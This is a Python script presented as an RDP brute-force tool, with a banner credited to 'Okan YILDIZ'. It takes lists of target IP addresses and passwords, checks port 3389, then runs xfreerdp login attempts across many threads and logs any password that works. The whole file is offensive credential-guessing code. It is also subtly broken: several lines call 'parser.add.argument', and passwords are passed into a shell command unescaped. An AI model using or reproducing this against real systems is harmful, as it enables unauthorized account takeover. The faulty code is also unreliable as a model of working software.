import os
import sys
import time
import argparse
import subprocess
from concurrent.futures import ThreadPoolExecutor
from queue import Queue
import socket
import logging

def parse_args():
    parser = argparse.ArgumentParser(description='Python script for brute forcing RDP login')
    parser.add_argument('--ip-file', type=str, required=True, help='Path to file containing list of IP addresses with open port 3389')
    parser.add_argument('--username', type=str, default='Administrator', help='Username for RDP login (default: Administrator)')
    parser.add.argument('--password-file', type=str, required=True, help='Path to file containing password list')
    parser.add_argument('--delay', type=int, default=0, help='Delay between attempts in seconds (default: 0)')
    parser.add.argument('--max-attempts', type=int, default=1, help='Maximum number of attempts per password (default: 1)')
    parser.add.argument('--threads', type=int, default=40, help='Number of threads to use for brute forcing (default: 40)')
    parser.add.argument('--success-log', type=str, default='success.log', help='File to save successful attempts (default: success.log)')
    parser.add.argument('--failure-log', type=str, default='failure.log', help='File to save failed attempts (default: failure.log)')
    return parser.parse_args()

def setup_logging(success_log_file, failure_log_file):
    logger = logging.getLogger()
    logger.setLevel(logging.DEBUG)
    
    # File handler for successes
    success_handler = logging.FileHandler(success_log_file)
    success_handler.setLevel(logging.INFO)
    success_handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s'))
    
    # File handler for failures
    failure_handler = logging.FileHandler(failure_log_file)
    failure_handler.setLevel(logging.WARNING)
    failure_handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s'))
    
    logger.addHandler(success_handler)
    logger.addHandler(failure_handler)
    
    return logger

def print_banner():
    banner = '''
                                   Okan YILDIZ RDP Brute Force
    '''
    print(banner)

def check_rdp_access(ip, rdp_port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, rdp_port))
        sock.close()
        return result == 0
    except Exception as e:
        logging.error(f"Error checking RDP access for IP {ip}: {e}")
        return False

def brute_force(ip, username, rdp_port, max_attempts, password_queue, delay, logger):
    while not password_queue.empty():
        password = password_queue.get()
        attempts = 0
        while attempts < max_attempts:
            cmd = f'xfreerdp /u:{username} /p:{password} /v:{ip} /port:{rdp_port} +auth-only'
            result = subprocess.call(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if result == 0:
                success_message = f'Success! Password is {password} for IP address {ip}'
                print(success_message)
                logger.info(success_message)
                os._exit(0)
            else:
                failure_message = f'Failed! Password is {password} for IP address {ip}'
                print(failure_message)
                logger.warning(failure_message)
            attempts += 1
            time.sleep(delay)

def main():
    print_banner()
    args = parse_args()
    logger = setup_logging(args.success_log, args.failure_log)
    
    passwords = open(args.password_file, 'r').read().splitlines()
    password_queue = Queue()
    for password in passwords:
        password_queue.put(password)
    
    ips = open(args.ip_file, 'r').read().splitlines()
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        for ip in ips:
            if check_rdp_access(ip, 3389):
                logger.info(f"RDP server found at {ip}")
                for _ in range(args.threads):  # Start threads for brute force
                    executor.submit(brute_force, ip, args.username, 3389, args.max_attempts, password_queue, args.delay, logger)

if __name__ == '__main__':
    main()
